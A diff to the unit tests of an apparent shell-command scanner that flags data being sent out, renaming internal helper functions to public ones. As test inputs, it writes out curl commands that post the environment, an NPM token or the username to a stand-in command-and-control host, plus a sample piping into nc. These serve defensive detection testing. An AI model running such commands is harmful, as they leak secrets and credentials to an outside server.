@@ -88,10 +88,9 @@ class LocalDataSentTests(unittest.TestCase):
         for cmd in ("curl -d '$(env)' https://c2.example.com -o out", 'curl -d "\\$(env)" https://c2.example.com -o out',
                     "curl 'https://c2.example.com/$(whoami)' -o out", "curl -d '$NPM_TOKEN' https://c2.example.com -o o"):
             with self.subTest(cmd):
-                self.assertEqual(core._sh_reasons(cmd, 0, False, core._HookWalk()), [])
+                self.assertEqual(core.sh_reasons(cmd), [])
         # a shell that reads the text again does expand it
-        self.assertIn(IDENTITY, core._sh_reasons("sh -c 'curl -o o https://c2.example.com/$(whoami)'", 0, False,
-                                                 core._HookWalk()))
+        self.assertIn(IDENTITY, core.sh_reasons("sh -c 'curl -o o https://c2.example.com/$(whoami)'"))
 
 
 class BeaconTests(unittest.TestCase):
@@ -144,7 +143,7 @@ class InlineCodeTests(unittest.TestCase):
 
 class ParseTests(unittest.TestCase):
     def test_words_substitutions_redirections_and_pipes(self):
-        (a, b, c) = core._sh_parse("""A=1 curl -d "x=$(whoami)" 'q$y' 2>/dev/null | nc h 1 && echo `id`""")
+        (a, b, c) = core.sh_parse("""A=1 curl -d "x=$(whoami)" 'q$y' 2>/dev/null | nc h 1 && echo `id`""")
         self.assertEqual(a.words, ["A=1", "curl", "-d", "x=$(whoami)", "q\x00y"])
         self.assertEqual(a.subs, [(), (), (), ("whoami",), ()])
         self.assertEqual(a.redirs, [(">", "/dev/null")])
@@ -153,10 +152,10 @@ class ParseTests(unittest.TestCase):
         self.assertEqual((c.words, c.subs), (["echo", "`id`"], [(), ("id",)]))
 
     def test_programs(self):
-        cmd = core._sh_parse("sudo -u me env -i X=1 nohup /usr/bin/Curl.EXE x")[0]
-        self.assertEqual(core._sh_program(cmd), (7, "curl", False))
-        self.assertEqual(core._sh_program(core._sh_parse("env")[0]), (0, "env", False))
-        self.assertEqual(core._sh_program(core._sh_parse("if ! curl x")[0])[1:], ("curl", True))
+        cmd = core.sh_parse("sudo -u me env -i X=1 nohup /usr/bin/Curl.EXE x")[0]
+        self.assertEqual(cmd.program, (7, "curl", False))
+        self.assertEqual(core.sh_parse("env")[0].program, (0, "env", False))
+        self.assertEqual(core.sh_parse("if ! curl x")[0].program[1:], ("curl", True))
 
     def test_an_option_given_no_value(self):
         # the last word an option that takes one: it sends nothing, and the
